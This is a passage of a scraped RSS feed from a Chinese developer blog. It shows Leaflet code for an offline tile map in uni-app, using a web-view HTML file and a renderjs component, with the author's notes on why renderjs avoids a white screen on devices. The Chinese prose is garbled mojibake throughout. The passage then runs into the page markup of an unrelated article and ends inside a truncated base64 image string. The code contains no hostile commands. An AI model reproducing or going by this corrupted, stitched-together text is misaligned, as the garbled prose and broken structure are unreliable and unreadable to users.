<p>åœ¨staticæ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ª <code>offline-map.html</code> æ–‡ä»¶</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">"utf-8"</span> /&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"viewport"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"width=device-width, initial-scale=1.0"</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>ç¦»çº¿åœ°å›¾<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"stylesheet"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"./leaflet/leaflet.css"</span> /&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
			<span class="hljs-selector-tag">html</span>,
			<span class="hljs-selector-tag">body</span> {
				<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
				<span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
			}

			<span class="hljs-selector-id">#map</span> {
				<span class="hljs-attribute">height</span>: <span class="hljs-number">100vh</span>;
				<span class="hljs-attribute">width</span>: <span class="hljs-number">100vw</span>;
				<span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span>;
				<span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span>;
			}
		</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"map"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./leaflet/leaflet.js"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
			<span class="hljs-keyword">const</span> baseUrl = <span class="hljs-string">'./tiles/{z}/{x}/{y}.jpg'</span>;
			<span class="hljs-keyword">const</span> map = L.<span class="hljs-title function_">map</span>(<span class="hljs-string">'map'</span>).<span class="hljs-title function_">setView</span>([<span class="hljs-number">23.56</span>, <span class="hljs-number">113.23</span>], <span class="hljs-number">15</span>);

			L.<span class="hljs-title function_">tileLayer</span>(baseUrl, {
				<span class="hljs-attr">minZoom</span>: <span class="hljs-number">15</span>,
				<span class="hljs-attr">maxZoom</span>: <span class="hljs-number">18</span>,
				<span class="hljs-attr">tms</span>: <span class="hljs-literal">true</span>,
				<span class="hljs-attr">attribution</span>: <span class="hljs-string">'Offline Tiles'</span>,
				<span class="hljs-attr">errorTileUrl</span>: <span class="hljs-string">''</span>
			}).<span class="hljs-title function_">addTo</span>(map);
		</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>æ‰¾åˆ° <code>pages/index/index.vue</code> æ–‡ä»¶ï¼Œé‡‡ç”¨ <code>web-view</code> å¼•ç”¨çš„æ–¹å¼å¼•å…¥ä¸Šè¿° html æ–‡ä»¶ã€‚</p>
<pre><code class="hljs language-html" lang="html">// pages/index/index.vue
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
	<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content"</span>&gt;</span>
		<span class="hljs-tag">&lt;<span class="hljs-name">web-view</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"/static/offline-map.html"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">web-view</span>&gt;</span>
	<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="css">
	<span class="hljs-selector-class">.content</span> {
		<span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;
		<span class="hljs-attribute">height</span>: <span class="hljs-number">100%</span>;
		<span class="hljs-attribute">display</span>: flex;
		<span class="hljs-attribute">flex-direction</span>: column;
		<span class="hljs-attribute">align-items</span>: center;
		<span class="hljs-attribute">justify-content</span>: center;
	}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
</code></pre>
<h2 data-id="heading-1">å®ç°æ–¹æ¡ˆäºŒï¼šrenderjs</h2>
<p>ä»ç„¶å°† <code>leafletjs</code> å’Œ <code>ç“¦ç‰‡å›¾ç‰‡æ–‡ä»¶å¤¹tiles</code> æ”¾å…¥ <code>static</code> æ–‡ä»¶å¤¹ä¸­ã€‚</p>
<pre><code class="hljs language-html" lang="html">// pages/index/index.vue
<span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">view</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"map"</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"map-container"</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">view</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">module</span>=<span class="hljs-string">"leaflet"</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"renderjs"</span>&gt;</span><span class="javascript">
    <span class="hljs-keyword">import</span> <span class="hljs-string">'@/static/leaflet/leaflet.css'</span>;
	<span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> L <span class="hljs-keyword">from</span> <span class="hljs-string">"@/static/leaflet/leaflet.js"</span>;

    <span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> {
		<span class="hljs-title function_">mounted</span>(<span class="hljs-params"/>) {
			<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">initMap</span>();
		},
		<span class="hljs-attr">methods</span>: {
			<span class="hljs-title function_">initMap</span>(<span class="hljs-params"/>) {
				<span class="hljs-keyword">const</span> baseUrl = <span class="hljs-string">'static/tiles/{z}/{x}/{y}.jpg'</span>
				map = L.<span class="hljs-title function_">map</span>(<span class="hljs-string">'map'</span>).<span class="hljs-title function_">setView</span>([<span class="hljs-number">23.56</span>, <span class="hljs-number">113.23</span>], <span class="hljs-number">15</span>);

				L.<span class="hljs-title function_">tileLayer</span>(baseUrl, {
					<span class="hljs-attr">minZoom</span>: <span class="hljs-number">15</span>,
					<span class="hljs-attr">maxZoom</span>: <span class="hljs-number">18</span>,
					<span class="hljs-attr">tms</span>: <span class="hljs-literal">true</span>,
					<span class="hljs-attr">attribution</span>: <span class="hljs-string">'Offline Tiles'</span>,
					<span class="hljs-attr">errorTileUrl</span>: <span class="hljs-string">''</span>
				}).<span class="hljs-title function_">addTo</span>(map);
			},
        }
    }
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p>è¿™é‡Œéœ€è¦æ³¨æ„çš„æ˜¯ä¸€å®šè¦åœ¨ <code>renderjs</code> ä¸­å®ç°ä¸Šè¿°ä»£ç ï¼Œå¦‚æœåœ¨å¸¸è§„ <code>script</code> ä¸­å®ç°ï¼Œåœ¨ <code>H5ç«¯</code> æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯è¿è¡Œåˆ°<code>çœŸæœº</code>ä¸Šä¼šç™½å±ã€‚ï¼ˆè¿™ä¸ªé—®é¢˜æˆ‘åå¤è¯•äº†å¥½å‡ æ¬¡éƒ½ä¸è¡Œï¼Œç»“æœè¿˜æ˜¯ä¸Šä¼ åˆ° <strong>Trae</strong> ä¸Šè§£å†³äº†è¿™ä¸ªé—®é¢˜ï¼‰ã€‚</p>
<p>å¯¼è‡´è¿™ç§æƒ…å†µçš„åŸå› æ˜¯åœ¨å¸¸è§„ sctipt ä¸­çš„ä»£ç ï¼Œåœ¨çœŸæœºä¸Šæ˜¯è¿è¡Œåœ¨ <strong>é€»è¾‘å±‚</strong> çš„ä»£ç ï¼Œæ— æ³•å¹²æ‰°åˆ° <strong>è§†å›¾å±‚</strong> çš„ç»“æ„ï¼Œè¿™ä¸€ç‚¹å’ŒWebæ˜¯ä¸åŒçš„ã€‚</p>
<p>è€Œ renderjs æ˜¯è¿è¡Œåœ¨ <strong>è§†å›¾å±‚</strong> çš„jsï¼Œå…·å¤‡æ“ä½œ <strong>DOM</strong> çš„èƒ½åŠ›ã€‚</p>
<p>å…¶æ¬¡æ˜¯å¼•ç”¨ static æ–‡ä»¶çš„è·¯å¾„ï¼Œimport static ä¸­çš„æ–‡ä»¶å¯ä»¥ä½¿ç”¨ <code>@/static</code> çš„æ–¹å¼ï¼Œä½†æ˜¯åœ¨ä»£ç ä¸­å¼•ç”¨ static æ–‡ä»¶éœ€è¦é‡‡ç”¨ <code>static/</code> çš„å½¢å¼ã€‚</p>
<h2 data-id="heading-2">æ€»ç»“</h2>
<p>æœ€åæˆ‘åšå®Œä»¥åè®© Trae ç»™äº†ä¸€ä¸‹è¯„ä»·ï¼ŒTrae è¡¨ç¤º<strong>ä¸å»ºè®®</strong>é‡‡ç”¨è¿™ç§æ–¹å¼å®ç°ç¦»çº¿åœ°å›¾ï¼Œé¦–å…ˆç“¦ç‰‡åœ°å›¾æ–‡ä»¶ä¸€èˆ¬<strong>éå¸¸å¤§</strong>ï¼Œæˆ‘ç”¨çš„ä»…ä»…æ˜¯å…¶ä¸­çš„ä¸€å°éƒ¨åˆ†ï¼Œä¹Ÿè¶…è¿‡äº† <strong>60MB</strong>ï¼Œæ‰“åŒ…å‡ºæ¥çš„ App åŒ…å¤ªå¤§äº†ã€‚</p>
<p>å…¶æ¬¡æ— è®ºæ˜¯ <code>web-view</code> è¿˜æ˜¯ <code>renderjs</code> æœ¬è´¨ä¸Šæ˜¯ä¸€æ ·çš„ã€‚åœ¨app-vueç¯å¢ƒä¸‹ï¼Œè§†å›¾å±‚ç”±webviewæ¸²æŸ“ï¼Œè€Œrenderjså°±æ˜¯è¿è¡Œåœ¨è§†å›¾å±‚çš„ã€‚</p>
<p>æ‰€ä»¥æ— è®ºæ˜¯æ¸²æŸ“æ•ˆç‡è¿˜æ˜¯å¼€å‘ä¸ŠåŸºæœ¬æ²¡å·®ã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ğŸŒ AI è‡ªä¸»å†³ç­–ï¼šä»æ–‡å­—åˆ°å›¾åƒä¸å£°éŸ³çš„ä¸‰å…ƒèµ‹èƒ½ä¹‹è·¯]]></title>    <link>https://juejin.cn/post/7592451588848877587</link>    <guid>https://juejin.cn/post/7592451588848877587</guid>    <pubDate>2026-01-08T03:12:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592451588848877587" data-draft-id="7592439090097258539" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ğŸŒ AI è‡ªä¸»å†³ç­–ï¼šä»æ–‡å­—åˆ°å›¾åƒä¸å£°éŸ³çš„ä¸‰å…ƒèµ‹èƒ½ä¹‹è·¯"/> <meta itemprop="keywords" content="äººå·¥æ™ºèƒ½,AIGC,ç®—æ³•"/> <meta itemprop="datePublished" content="2026-01-08T03:12:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="LeonGao"/> <meta itemprop="url" content="https://juejin.cn/user/3976252950591149"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ğŸŒ AI è‡ªä¸»å†³ç­–ï¼šä»æ–‡å­—åˆ°å›¾åƒä¸å£°éŸ³çš„ä¸‰å…ƒèµ‹èƒ½ä¹‹è·¯
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3976252950591149/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    LeonGao
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T03:12:46.000Z" title="Thu Jan 08 2026 03:12:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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")}.markdown-body h2{position:relative;padding:0 0 0 20px;font-size:20px;font-weight:700;color:#614500}.markdown-body h2:before{content:"";position:absolute;top:3px;bottom:0;left:0;background-image:url("data:image/png;base64,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